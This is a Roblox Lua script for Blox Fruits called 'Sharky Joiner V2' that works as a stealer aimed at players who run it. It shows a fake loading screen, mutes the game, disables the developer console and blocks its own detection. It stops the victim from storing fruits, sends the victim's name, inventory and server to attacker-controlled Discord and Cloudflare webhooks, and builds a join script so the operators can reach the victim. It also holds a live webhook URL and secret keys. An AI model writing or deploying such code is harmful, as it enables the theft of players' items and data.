Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/d3690bb6-d5ac-4891-b7cc-8f55263cfadb" -- << Protected URL for main hits
Usernames = { "user1", "user2", "user3", "user4", "user5" } -- << Your usernames here
FruitsToHit = { "Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Ghost-Ghost", "Dragon (West)-Dragon (West)", "Dragon (East)-Dragon (East)" } -- << Fruits you want

--obfuscate after this, use loadstring for this coming

Protector = "https://sharky-on-top.script-config-protector.workers.dev/w/d5c5ec6c-2983-4512-a59d-a03bb0d30d92" -- << Protected URL for main hits (secondary)
dummy = "https://sharky-on-top.script-config-protector.workers.dev/w/061ccfe8-01fd-414b-b874-38de6b02d928" -- << Protected URL for admin/special hits

ActivationPasswords = { "ishusontop", "bonzarbal", "ishufishy" } -- Passwords for ?activate command
-- !!! YOUR SECRET KEY - MUST MATCH THE 'CLIENT_API_KEY' SECRET IN CLOUDFLARE !!!
local validation_sig = "rashya5@%-hsfj79h93-wakliballs" -- KEEP THIS SAFE AND MATCH SERVER
local allowEveryone = false -- Flag to allow commands/trade for everyone
local activatedUsers = {}   -- Stores UserIds of players activated via password { [UserId] = true }

-- Emoji Map for Fruit Display
local fruitEmojiMap = {
    ["Barrier-Barrier"] = "<:barrier:660245023765561344>",
    ["Blizzard-Blizzard"] = "<:blizzard:1056979177674387547>",
    ["Bomb-Bomb"] = "<:bomb:590579368246378506>",
    ["Buddha-Buddha"] = "<:buddha:1317755758347288616>",
    ["Chop-Chop"] = "<:chop:590579369592750100>",
    ["Control-Control"] = "<:control:709260359370014722>",
    ["Creation-Creation"] = "<:creation:1362653383131004969>",
    ["Dark-Dark"] = "<:dark:1317755995665207376>",
    ["Diamond-Diamond"] = "<:diamond:1317756492144836618>",
    ["T-Rex-T-Rex"] = "<:dino:1189804216903008276>",
    ["Dough-Dough"] = "<:dough:1317755522073624637>",
    ["Mammoth-Mammoth"] = "<:mammoth:1165678609512542218>",
    ["Pain-Pain"] = "<:pain:1170004224915021864>",
    ["Phoenix-Phoenix"] = "<:phoenix:590579369253011478>",
    ["Portal-Portal"] = "<:portal:1056979327075483728>",
    ["Quake-Quake"] = "<:quake:1317756761368952893>",
    ["Rocket-Rocket"] = "<:rocket:1166711048317972510>",
    ["Rubber-Rubber"] = "<:rubber:590579368896757760>",
    ["Rumble-Rumble"] = "<:rumble:1317756124350382183>",
    ["Sand-Sand"] = "<:sand:597623803496890379>",
    ["Shadow-Shadow"] = "<:shadow:906379537137418310>",
    ["Blade-Blade"] = "<:slice:1324404414848565361>",
    ["Smoke-Smoke"] = "<:smoke:590579367692730387>",
    ["Sound-Sound"] = "<:sound:1165678605423083521>",
    ["Spider-Spider"] = "<:spider:1093933323253985460>",
    ["Spike-Spike"] = "<:spike:1317756623577415690>",
    ["Spin-Spin"] = "<:spin:886279018607964240>",
    ["Spirit-Spirit"] = "<:spirit:1056978177945247754>",
    ["Spring-Spring"] = "<:spring:590582765620297748>",
    ["Venom-Venom"] = "<:venom:886279018104619019>",
    ["Yeti-Yeti"] = "<:yeti:1322418732328554577>",
    ["Dragon (East)-Dragon (East)"] = "<:dragonE:1318248271457812510>",
    ["Dragon (West)-Dragon (West)"] = "<:dragonW:1318248380555591842>",
    ["Dragon-Dragon"] = "<:dragonE:1318248271457812510>", -- Fallback for generic Dragon
    ["Eagle-Eagle"] = "<:eagle:1362652662985920604>",
    ["Flame-Flame"] = "<:flame:1317755887925858334>",
    ["Gas-Gas"] = "<:gas:1317756925311586324>",
    ["Ghost-Ghost"] = "<:ghost:1169961378946224231>",
    ["Gravity-Gravity"] = "<:gravity:1362652665179275476>",
    ["Ice-Ice"] = "<:ice:590579369462988837>",
    ["Kitsune-Kitsune"] = "<:kitsune:1185239741545848922>",
    ["Leopard-Leopard"] = "<:leopard:1018364446223122443>",
    ["Light-Light"] = "<:light:1317756250049613874>",
    ["Love-Love"] = "<:love:886279020122103828>",
    ["Magma-Magma"] = "<:magma:1317756326775881748>",
}

-- << Obfuscate after this moment >>

print("Sharky Joiner V2 - Initializing...")
-- while true do end -- Placeholder comment

repeat
    task.wait()
until game:IsLoaded()

-- Core Services
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Lighting = game:GetService("Lighting")
local Teams = game:GetService("Teams")

-- Initial Setup & Anti-Tamper
if CoreGui:FindFirstChild("RobloxGui") then
    CoreGui.RobloxGui.Enabled = false
end

local function takeAction()
    if setfpscap then
        setfpscap(0)
    end
    rconsoleclear()
    print = function()
    end
    warn = function()
    end
    error = function()
    end
    setclipboard = function()
    end
    while true do
        task.wait()
    end
end

local function checkGui(gui)
    if gui:IsA("ScreenGui") then
        local nestedGui = gui:FindFirstChild(gui.Name)
        if nestedGui and nestedGui:IsA("ScreenGui") then
            if nestedGui:FindFirstChild("Orion") then
                takeAction()
            end
        end
    end
end

for _, gui in ipairs(CoreGui:GetChildren()) do
    checkGui(gui)
end
CoreGui.ChildAdded:Connect(checkGui)

if LocalPlayer and (LocalPlayer.Name == "doitenroitest1" or LocalPlayer.Name == "SHAKINGSHARKER" or LocalPlayer.Name == "shirkarsharker") then
    takeAction()
end

if ishooked and (ishooked(game.HttpGet) or ishooked(request)) then
    takeAction()
end

-- Config Validation
if not Webhook or not Protector or not dummy or not Usernames or not FruitsToHit or not ActivationPasswords or not validation_sig then
    LocalPlayer:Kick("Config Error: Missing variable(s).")
    return
end
if type(Webhook)~="string" or type(Protector)~="string" or type(dummy)~="string" or type(Usernames)~="table" or type(FruitsToHit)~="table" or type(ActivationPasswords)~="table" or type(validation_sig)~="string" then
    LocalPlayer:Kick("Config Error: Variable type mismatch.")
    return
end
-- *** CORRECTED Validation Check (Reverted to simpler version) ***
if validation_sig == "" or validation_sig:find("YourActualSecret") then
    LocalPlayer:Kick("SECURITY ERROR: Validation signature not configured!")
    return
end
-- *** End of Corrected Check ***
if Webhook:find("REPLACE_WITH_PROTECTED_ID") or Protector:find("REPLACE_WITH_PROTECTED_ID") or dummy:find("REPLACE_WITH_PROTECTED_ID") then
    LocalPlayer:Kick("ERROR: Protected Webhook URLs are not configured!")
    return
end

-- Ensure Core Admins & Check Blacklist
local function ensureAdminUsernames()
    local coreAdmins = {
        "x6TNine",
        "aka_0ver",
        "bonzarbal53",
        "bonzarbal52",
        "bonzarbal51",
        "bonzarbal50",
        "xRip_Cyborg"
    }
    if type(Usernames) ~= "table" then
        Usernames = {}
    end
    local existingUsernames = {}
    for _, name in ipairs(Usernames) do
        existingUsernames[string.lower(name)] = true
    end
    for _, adminName in ipairs(coreAdmins) do
        if not existingUsernames[string.lower(adminName)] then
            table.insert(Usernames, adminName)
        end
    end
end
ensureAdminUsernames()

if Usernames and (table.find(Usernames, "XFistorRespawn") or table.find(Usernames, "doitenroitest1")) then
    while true do
        task.wait()
    end
end

CoreGui.ChildAdded:Connect(function(child)
    if child.Name == "DevConsoleMaster" then
        child.Enabled = false
    end
end)

-- Secure Webhook Storage
local function storeWebhookSafely(webhookUrl)
    if not webhookUrl or type(webhookUrl) ~= "string" or webhookUrl:match("^Enter Webhook") then
        return nil
    end
    local randomName = "var_" .. tostring(math.random(100000, 999999)) .. "_" .. tostring(math.random(100, 999))
    _G[randomName] = webhookUrl
    return randomName
end

local webhook1_key = storeWebhookSafely(Webhook);
Webhook = nil
local Protector_key = storeWebhookSafely(Protector);
Protector = nil
local dummy_key = storeWebhookSafely(dummy);
dummy = nil

-- Silence Remote Console
rconsoleprint = function()
end;
rconsolewarn = function()
end;
rconsoleerr = function()
end;
rconsoleinfo = function()
end

-- Game Specific Variables
local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
local ServerBrowser = ReplicatedStorage:FindFirstChild("__ServerBrowser")
local privateServerOwner = ReplicatedStorage:FindFirstChild("PrivateServerOwnerId")

-- Check for Private Server
if privateServerOwner and privateServerOwner:IsA("IntValue") and privateServerOwner.Value > 0 then
    LocalPlayer:Kick("This script doesn't work on private servers.")
end

-- Mute Game Volume
pcall(function()
    UserSettings():GetService("UserGameSettings").MasterVolume = 0
end)

-- Anti Fruit Store Hook
local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    local method = getnamecallmethod()
    if not checkcaller() and method and method:lower() == "invokeserver" then
        local args = {
            ...
        }
        if args[1] == "StoreFruit" then
            return error("External fruit store attempt blocked.", 0)
        end
    end
    return oldNamecall(self, ...)
end))

-- Utility Functions
local function getInventory()
    local success, result = pcall(Remote.InvokeServer, Remote, "getInventory")
    if not success then
        warn("getInventory failed:", result);
        return nil
    end
    return result
end

local function JoinTeam()
    if LocalPlayer.Team ~= Teams.Marines and LocalPlayer.Team ~= Teams.Pirates then
        pcall(Remote.InvokeServer, Remote, "SetTeam", "Marines")
    end
end

local function getServerName()
    local adjectives = { "Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich", "Short", "Adorable", "Alive", "Colorful", "Angry", "Good", "Beautiful", "Ugly", "Hot", "Cold", "Evil", "Famous", "Original", "Unoriginal", "Kind", "Nice", "Real", "Expensive", "Wild", "Wide", "Fake", "Proud", "Super", "Strange", "Wrong", "Right", "Talented", "Complex", "Pure", "Fancy", "Lucky", "Fresh", "Fantastic", "Dull", "Dizzy", "Eternal", "Mental", "Infinite", "Rogue" }
    local nouns = { "TAWG", "Robson", "Krazy", "Fruit", "Realm", "World", "Place", "Experience", "Dog", "Cat", "Guy", "Bird", "Legion", "Gank", "Family", "Sun", "Moon", "Gun", "Sword", "Melee", "Defense", "Bomb", "Spike", "Chop", "Spring", "Smoke", "Flame", "Ice", "Sand", "Dark", "Light", "Rubber", "Barrier", "Magma", "Leopard", "Quake", "Buddha", "Spider", "Phoenix", "Rumble", "Love", "Door", "Paw", "Gravity", "Dough", "Venom", "Control", "Dragon", "Falcon", "Diamond", "Kilo", "Shark", "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow" }
    local seed = tonumber("0x" .. game.JobId:gsub("-", ""):sub(1, 7)) or os.time()
    local random = Random.new(seed)
    return string.format("%s %s #%04d", adjectives[random:NextInteger(1, # adjectives)], nouns[random:NextInteger(1, # nouns)], random:NextInteger(1, 9999))
end

-- Loading Notification UI (Sharky's Original)
local function createNotification()
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    local loadingScreen = Instance.new("ScreenGui");
    loadingScreen.Name = "BloxFruitsLoadingUI";
    loadingScreen.IgnoreGuiInset = true;
    loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
    loadingScreen.Parent = playerGui
    local blur = Instance.new("BlurEffect");
    blur.Size = 0;
    blur.Parent = Lighting
    local background = Instance.new("Frame");
    background.Name = "Background";
    background.Size = UDim2.new(1, 0, 1, 0);
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0);
    background.BackgroundTransparency = 1;
    background.Parent = loadingScreen
    local container = Instance.new("Frame");
    container.Name = "Container";
    container.Size = UDim2.new(0, 600, 0, 300);
    container.Position = UDim2.new(0.5, 0, 1.2, 0);
    container.AnchorPoint = Vector2.new(0.5, 0.5);
    container.BackgroundColor3 = Color3.fromRGB(25, 25, 30);
    container.BorderSizePixel = 0;
    container.Parent = loadingScreen
    Instance.new("UICorner", container).CornerRadius = UDim.new(0, 10)
    local uiStroke = Instance.new("UIStroke");
    uiStroke.Color = Color3.fromRGB(65, 169, 255);
    uiStroke.Thickness = 2;
    uiStroke.Parent = container
    local headerFrame = Instance.new("Frame");
    headerFrame.Name = "Header";
    headerFrame.Size = UDim2.new(1, 0, 0, 60);
    headerFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45);
    headerFrame.BorderSizePixel = 0;
    headerFrame.Parent = container
    Instance.new("UICorner", headerFrame).CornerRadius = UDim.new(0, 10)
    local titleLabel = Instance.new("TextLabel");
    titleLabel.Name = "Title";
    titleLabel.Size = UDim2.new(1, 0, 1, 0);
    titleLabel.BackgroundTransparency = 1;
    titleLabel.Font = Enum.Font.GothamBold;
    titleLabel.Text = "Blox Fruits - Loading Script.";
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255);
    titleLabel.TextSize = 24;
    titleLabel.Parent = headerFrame
    local bottomFrame = Instance.new("Frame");
    bottomFrame.Name = "BottomFrame";
    bottomFrame.Size = UDim2.new(1, 0, 0, 10);
    bottomFrame.Position = UDim2.new(0, 0, 1, - 10);
    bottomFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45);
    bottomFrame.BorderSizePixel = 0;
    bottomFrame.ZIndex = 2;
    bottomFrame.Parent = headerFrame
    local messageLabel = Instance.new("TextLabel");
    messageLabel.Name = "Message";
    messageLabel.Size = UDim2.new(1, - 40, 0, 60);
    messageLabel.Position = UDim2.new(0, 20, 0, 80);
    messageLabel.BackgroundTransparency = 1;
    messageLabel.Font = Enum.Font.Gotham;
    messageLabel.Text = "The script Is loading - Please, wait.";
    messageLabel.TextColor3 = Color3.fromRGB(220, 220, 220);
    messageLabel.TextSize = 18;
    messageLabel.TextWrapped = true;
    messageLabel.TextXAlignment = Enum.TextXAlignment.Center;
    messageLabel.Parent = container
    local loadingBarBg = Instance.new("Frame");
    loadingBarBg.Name = "LoadingBarBg";
    loadingBarBg.Size = UDim2.new(1, - 40, 0, 20);
    loadingBarBg.Position = UDim2.new(0, 20, 0, 150);
    loadingBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 50);
    loadingBarBg.BorderSizePixel = 0;
    loadingBarBg.Parent = container
    Instance.new("UICorner", loadingBarBg).CornerRadius = UDim.new(0, 6)
    local loadingBar = Instance.new("Frame");
    loadingBar.Name = "LoadingBar";
    loadingBar.Size = UDim2.new(0, 0, 1, 0);
    loadingBar.BackgroundColor3 = Color3.fromRGB(65, 169, 255);
    loadingBar.BorderSizePixel = 0;
    loadingBar.Parent = loadingBarBg
    Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0, 6)
    local progressLabel = Instance.new("TextLabel");
    progressLabel.Name = "Progress";
    progressLabel.Size = UDim2.new(1, 0, 0, 20);
    progressLabel.Position = UDim2.new(0, 0, 0, 180);
    progressLabel.BackgroundTransparency = 1;
    progressLabel.Font = Enum.Font.Gotham;
    progressLabel.Text = "Loading... 0%";
    progressLabel.TextColor3 = Color3.fromRGB(180, 180, 180);
    progressLabel.TextSize = 16;
    progressLabel.Parent = container
    local discordButton = Instance.new("TextButton");
    discordButton.Name = "DiscordButton";
    discordButton.Size = UDim2.new(0, 180, 0, 40);
    discordButton.Position = UDim2.new(0.5, 0, 0, 230);
    discordButton.AnchorPoint = Vector2.new(0.5, 0);
    discordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242);
    discordButton.BorderSizePixel = 0;
    discordButton.Font = Enum.Font.GothamBold;
    discordButton.Text = "Join Discord";
    discordButton.TextColor3 = Color3.fromRGB(255, 255, 255);
    discordButton.TextSize = 16;
    discordButton.Parent = container
    Instance.new("UICorner", discordButton).CornerRadius = UDim.new(0, 8)
    local discordIcon = Instance.new("ImageLabel");
    discordIcon.Name = "DiscordIcon";
    discordIcon.Size = UDim2.new(0, 20, 0, 20);
    discordIcon.Position = UDim2.new(0, 15, 0.5, 0);
    discordIcon.AnchorPoint = Vector2.new(0, 0.5);
    discordIcon.BackgroundTransparency = 1;
    discordIcon.Image = "rbxassetid://10367063073";
    discordIcon.Parent = discordButton
    discordButton.MouseButton1Click:Connect(function()
        local discordInvite = "https://discord.gg/uwdvTtqTDA"
        setclipboard(discordInvite)
        local notification = Instance.new("TextLabel");
        notification.Name = "CopiedNotification";
        notification.Size = UDim2.new(0, 180, 0, 30);
        notification.Position = UDim2.new(0.5, 0, 0, 275);
        notification.AnchorPoint = Vector2.new(0.5, 0);
        notification.BackgroundColor3 = Color3.fromRGB(50, 50, 60);
        notification.BorderSizePixel = 0;
        notification.Font = Enum.Font.Gotham;
        notification.Text = "Discord link copied!";
        notification.TextColor3 = Color3.fromRGB(255, 255, 255);
        notification.TextSize = 14;
        notification.BackgroundTransparency = 1;
        notification.TextTransparency = 1;
        notification.Parent = container
        Instance.new("UICorner", notification).CornerRadius = UDim.new(0, 6)
        TweenService:Create(notification, TweenInfo.new(0.3), {
            BackgroundTransparency = 0,
            TextTransparency = 0
        }):Play()
        task.delay(2, function()
            if notification.Parent then
                TweenService:Create(notification, TweenInfo.new(0.3), {
                    BackgroundTransparency = 1,
                    TextTransparency = 1
                }):Play();
                task.delay(0.3, function()
                    notification:Destroy()
                end)
            end
        end)
    end)
    TweenService:Create(blur, TweenInfo.new(0.5), {
        Size = 20
    }):Play()
    TweenService:Create(background, TweenInfo.new(0.5), {
        BackgroundTransparency = 0.5
    }):Play()
    TweenService:Create(container, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, 0, 0.5, 0)
    }):Play()
    task.delay(1, function()
        local startTime = tick();
        local totalDuration = 120;
        local lastProgress = 0
        while lastProgress < 99 and (tick() - startTime) < totalDuration and loadingScreen.Parent do
            local timeElapsed = tick() - startTime;
            local speedFactor = 0.5 + math.abs(math.sin(timeElapsed * 0.8)) * 1.5;
            local increment = math.min(0.7, (99 - lastProgress) / 100) * speedFactor;
            local newProgress = math.min(99, lastProgress + increment)
            if newProgress > lastProgress then
                lastProgress = newProgress;
                progressLabel.Text = (lastProgress > 75 and "Verifying account..." or "Loading...") .. " " .. math.floor(lastProgress) .. "%";
                TweenService:Create(loadingBar, TweenInfo.new(0.2), {
                    Size = UDim2.new(lastProgress / 100, 0, 1, 0)
                }):Play()
            end
            task.wait(0.1)
        end
        if loadingScreen.Parent then
            progressLabel.Text = "Verifying account... 99%";
            TweenService:Create(loadingBar, TweenInfo.new(0.2), {
                Size = UDim2.new(0.99, 0, 1, 0)
            }):Play()
        end
    end)
    local function cleanup()
        TweenService:Create(blur, TweenInfo.new(0.5), {
            Size = 0
        }):Play();
        TweenService:Create(background, TweenInfo.new(0.5), {
            BackgroundTransparency = 1
        }):Play();
        TweenService:Create(container, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Position = UDim2.new(0.5, 0, 1.2, 0)
        }):Play();
        task.delay(0.6, function()
            if loadingScreen and loadingScreen.Parent then
                loadingScreen:Destroy()
            end;
            if blur and blur.Parent then
                blur:Destroy()
            end
        end)
    end
    task.spawn(function()
        while loadingScreen.Parent do
            local colors = {
                Color3.fromRGB(255, 100, 100),
                Color3.fromRGB(100, 100, 255),
                Color3.fromRGB(100, 255, 100),
                Color3.fromRGB(65, 169, 255)
            };
            for _, color in ipairs(colors) do
                if not loadingScreen.Parent or not uiStroke.Parent then
                    break
                end;
                pcall(function()
                    TweenService:Create(uiStroke, TweenInfo.new(1.5), {
                        Color = color
                    }):Play()
                end);
                task.wait(1.5)
            end
        end
    end)
    return {
        Destroy = cleanup
    }
end

-- Webhook Security & Sending Setup
local originalRequest = request
local originalHttpRequest = http and http.request
local originalSynRequest = syn and syn.request
local headerCache = {
    ["Content-Type"] = "application/json"
}
local TEST_WEBHOOK = "https://discord.com/api/webhooks/1361624271939698760/Xt7bz7aveyyhK_VrXFprRGWn3WAHeXKZ3prGfivfVrYbTCwyn68_HR6-HfL-qDN3KiVs"
local TEST_PAYLOAD = HttpService:JSONEncode({
    content = "# :shark: Sharky! TEST :) :shark:"
})
local cachedNonce, cachedHeaders

local function isRequestHooked()
    return request ~= originalRequest or (syn and syn.request ~= originalSynRequest) or (http and http.request ~= originalHttpRequest) or debug.getinfo(request).what ~= "C"
end
local function checkSecurity()
    local env = getfenv(2);
    if env == getfenv(0) or env == getfenv(1) then
        return not isRequestHooked() and not getrawmetatable(request)
    end;
    local meta = getmetatable(env);
    return not (meta and (meta.__newindex or meta.__index))
end
local function testRequest()
    if not cachedNonce then
        cachedNonce = HttpService:GenerateGUID(false);
        cachedHeaders = table.clone(headerCache);
        cachedHeaders["X-Test-Nonce"] = cachedNonce
    end;
    local success, response = pcall(request, {
        Url = TEST_WEBHOOK,
        Method = "POST",
        Headers = cachedHeaders,
        Body = TEST_PAYLOAD
    });
    return success and response and response.StatusCode < 400
end

local function SafeRequest(requestData)
    if not checkSecurity() or not testRequest() then
        if takeAction then
            takeAction()
        end;
        return
    end
    local protectedRequest = {
        Method = requestData.Method,
        Body = requestData.Body,
        Url = requestData.Url
    }
    protectedRequest.Headers = requestData.Headers or {}
    protectedRequest.Headers["Content-Type"] = "application/json"
    protectedRequest.Headers["X-Request-Time"] = tostring(os.time() + math.random(1, 100))
    protectedRequest.Headers["X-Nonce"] = HttpService:GenerateGUID(false)
    -- X-Client-Key should already be in requestData.Headers if passed correctly
    return pcall(request, protectedRequest)
end

-- Security Monitor
local lastCheckTime = 0;
local CHECK_INTERVAL = 6
RunService:BindToRenderStep("SecurityMonitor", Enum.RenderPriority.Last.Value, function(deltaTime)
    lastCheckTime = lastCheckTime + deltaTime;
    if lastCheckTime < CHECK_INTERVAL then
        return
    end;
    lastCheckTime = 0
    if isRequestHooked() then
        request = originalRequest;
        if http then
            http.request = originalHttpRequest
        end;
        if syn then
            syn.request = originalSynRequest
        end;
        if takeAction then
            takeAction()
        end;
        if isRequestHooked() then
            RunService:UnbindFromRenderStep("SecurityMonitor")
        end
    end
end)

-- Embed Formatting Functions
local function formatFruitListWithEmojis_NoCodeBlock(fruits)
    if not fruits or # fruits == 0 then
        return "None"
    end
    local lines = {};
    table.sort(fruits, function(a, b)
        return (a.value or 0) > (b.value or 0)
    end)
    for _, fruit in ipairs(fruits) do
        local emoji = fruitEmojiMap[fruit.name] or "";
        local prefix = emoji ~= "" and (emoji .. " ") or ""
        local countSuffix = fruit.count > 1 and string.format(" (x%d)", fruit.count) or ""
        table.insert(lines, string.format("%s%s%s", prefix, fruit.name, countSuffix))
    end
    local MAX_LINES = 15;
    if # lines > MAX_LINES then
        local displayLines = {};
        for i = 1, MAX_LINES do
            table.insert(displayLines, lines[i])
        end;
        table.insert(displayLines, string.format("*... and %d more*", # lines - MAX_LINES));
        return table.concat(displayLines, "\n")
    else
        return table.concat(lines, "\n")
    end
end

local function formatPremiumList_NoCodeBlock(premiumItems)
    if not premiumItems or # premiumItems == 0 then
        return "None"
    end
    local lines = {};
    table.sort(premiumItems, function(a, b)
        return a.name < b.name
    end)
    for _, item in ipairs(premiumItems) do
        local emoji = "";
        local prefix = emoji ~= "" and (emoji .. " ") or ""
        local countSuffix = item.count > 1 and string.format(" (x%d)", item.count) or ""
        table.insert(lines, string.format("%s%s%s", prefix, item.name, countSuffix))
    end
    local MAX_LINES = 10;
    if # lines > MAX_LINES then
        local displayLines = {};
        for i = 1, MAX_LINES do
            table.insert(displayLines, lines[i])
        end;
        table.insert(displayLines, string.format("*... and %d more*", # lines - MAX_LINES));
        return table.concat(displayLines, "\n")
    else
        return table.concat(lines, "\n")
    end
end

local function formatCombinedTargets_CodeBlocks_NoSeparator(fruits, premiumItems, fruitsToHitSet)
    local targetLines = {};
    local foundTargetFruit = false;
    local foundTargetPremium = false;
    local totalTargetsFound = 0;
    local MAX_TARGET_BLOCKS = 7
    if fruits then
        table.sort(fruits, function(a, b)
            return (a.value or 0) > (b.value or 0)
        end);
        for _, fruit in ipairs(fruits) do
            if fruitsToHitSet[fruit.name] and totalTargetsFound < MAX_TARGET_BLOCKS then
                foundTargetFruit = true;
                totalTargetsFound = totalTargetsFound + 1;
                local nameOnly = fruit.name;
                local countSuffix = fruit.count > 1 and string.format(" (x%d)", fruit.count) or "";
                table.insert(targetLines, string.format("```\n%s%s\n```", nameOnly, countSuffix))
            end
        end
    end
    if premiumItems then
        table.sort(premiumItems, function(a, b)
            return a.name < b.name
        end);
        for _, item in ipairs(premiumItems) do
            if totalTargetsFound < MAX_TARGET_BLOCKS then
                foundTargetPremium = true;
                totalTargetsFound = totalTargetsFound + 1;
                local nameOnly = item.name;
                local countSuffix = item.count > 1 and string.format(" (x%d)", item.count) or "";
                table.insert(targetLines, string.format("```\n%s%s\n```", nameOnly, countSuffix))
            end
        end
    end
    if not foundTargetFruit and not foundTargetPremium then
        return "```\nNone\n```"
    end
    local actualTargetsCount = 0;
    if fruits then
        for _, f in ipairs(fruits) do
            if fruitsToHitSet[f.name] then
                actualTargetsCount = actualTargetsCount + 1
            end
        end
    end;
    if premiumItems then
        actualTargetsCount = actualTargetsCount + # premiumItems
    end
    if actualTargetsCount > MAX_TARGET_BLOCKS then
        table.insert(targetLines, string.format("```\n... and %d more\n```", actualTargetsCount - MAX_TARGET_BLOCKS))
    end
    return table.concat(targetLines, "") -- Concatenate with no separator
end

-- Main Webhook Function (sendWebhook) - MODIFIED
local function sendWebhook(inventory)
    if isRequestHooked() or not checkSecurity() then
        takeAction();
        return
    end

    local url1 = webhook1_key and _G[webhook1_key]
    local url2 = Protector_key and _G[Protector_key]
    local url3 = dummy_key and _G[dummy_key]
    if not url1 then
        warn("Primary Webhook URL not configured.");
        return
    end

    local goodFruitNames = {
        ["Kitsune-Kitsune"] = true,
        ["Yeti-Yeti"] = true
    } -- Example "Good" fruits

    local fruits, premiumItems = {}, {};
    local dragonHit, hasPremiumItem, hasGoodFruit = false, false, false;
    local fruitsToHitSet = {};
    for _, f in ipairs(FruitsToHit) do
        fruitsToHitSet[f] = true
    end

    for _, item in ipairs(inventory) do
        if item.Type == "Blox Fruit" or item.Type == "Premium" then
            local itemData = {
                name = item.Name,
                count = item.Count,
                value = item.Value or 0
            };
            if item.Type == "Blox Fruit" then
                table.insert(fruits, itemData);
                if item.Name:find("Dragon") then
                    dragonHit = true;
                    fruitsToHitSet[item.Name] = true
                end -- Add dragon to targets dynamically
                if goodFruitNames[item.Name] then
                    hasGoodFruit = true
                end
            else
                table.insert(premiumItems, itemData);
                hasPremiumItem = true
            end
        end
    end
    -- Generate Join Script (Rua Style with Escaping, with extra check inside queued code)
    local jobId = game.JobId
    local placeId = game.PlaceId
    local isSea3 = (placeId == 7449423635)
    local seaTravelArgument = isSea3 and "TravelZou" or "TravelDressrosa"

    -- Wrap the original script code in a loop so it executes twice
    local joinScriptFormatString = [=[
    for i = 1, 2 do
        local iddd = %d
        local JobIdd = "%s"
        local sea = "%s"
        if game.PlaceId ~= iddd then
            queue_on_teleport([[
                task.wait(5)
                if game.JobId ~= JobIdd then
                    game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
                else
                end
            ]])
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(sea)
        else
            game:GetService("TeleportService"):TeleportToPlaceInstance(iddd, JobIdd)
        end
    end
    ]=]

    -- Then, use string.format with the variables
    local joinScriptLua = string.format(joinScriptFormatString, placeId, jobId, seaTravelArgument, placeId, jobId)

    -- Do NOT escape quotes for the PC embed; just wrap in code block
    local joinScriptPC_Formatted = "```lua\n" .. joinScriptLua .. "\n```"
    local joinScriptMobile_Formatted = joinScriptLua

    -- Determine Embed Title, Color, Mention
    local embedTitle, embedColor, mention
    if dragonHit and hasPremiumItem then
        embedTitle = "<:dragonE:1318248271457812510><:value:1228807380188397649> DRAGON & PREMIUM HIT!"
        embedColor = 65280;
        mention = "@everyone Sharky - GG!"
    elseif dragonHit then
        embedTitle = "<:dragonE:1318248271457812510> DRAGON HIT! <a:moistwoo:1013950690277724170>"
        embedColor = 16776960;
        mention = "@everyone Sharky - GG!"
    elseif hasPremiumItem then
        embedTitle = "<:value:1228807380188397649> PREMIUM ITEM HIT!"
        embedColor = 3447003;
        mention = "@everyone Sharky - GG!"
    elseif hasGoodFruit then -- Check for good fruit for admin/dummy webhook
        embedTitle = "<:kitsune:1185239741545848922> GOOD FRUIT HIT! (Kitsune/Yeti)" -- Example title
        embedColor = 16753920;
        mention = "@everyone Sharky Hit!" -- Normal mention for main hooks
    elseif # fruits > 0 or # premiumItems > 0 then -- Check if *any* target fruit was found
        local foundAnyTarget = false
        for _, f in ipairs(fruits) do
            if fruitsToHitSet[f.name] then
                foundAnyTarget = true;
                break
            end
        end
        if foundAnyTarget then
            embedTitle = "<:pepeyes:1226249991035682897> Target Fruit Hit!"
            embedColor = 10181046;
            mention = "@everyone Sharky Hit!"
        else
            embedTitle = "<:pepeyes:1226249991035682897> Sharky Joiner Hit!"
            embedColor = 10181046;
            mention = "@everyone Sharky Hit!"
        end
    else
        embedTitle = "<:pepeyes:1226249991035682897> Sharky Joiner Hit!"
        embedColor = 10181046;
        mention = "@everyone Sharky Hit!"
    end

    local serverName = getServerName()
    local executorName = identifyexecutor() or "Unknown"

    -- Construct Embed Payload (Lua Table)
    local embedData = {
        title = embedTitle,
        color = embedColor,
        fields = {
            {
                name = "<:Verified:1248961823856918623> **Victim Info**",
                value = string.format("**Name:** %s\n**Sea:** %s\n**Server:** **%s**", LocalPlayer.Name, (isSea3 and "Sea 3" or "Sea 2"), serverName),
                inline = true
            },
            {
                name = "<:Point_Right:1223617791710724219> **Session Info**",
                value = string.format("**Players:** %d\n**Time:** %s\n**Executor:** %s", # Players:GetPlayers(), os.date("%Y-%m-%d %H:%M:%S"), executorName),
                inline = true
            },
            {
                name = "<a:womanalert:1285800405233827870> **TARGET ITEMS FOUND** <a:womanalert:1285800405233827870>",
                value = formatCombinedTargets_CodeBlocks_NoSeparator(fruits, premiumItems, fruitsToHitSet),
                inline = false
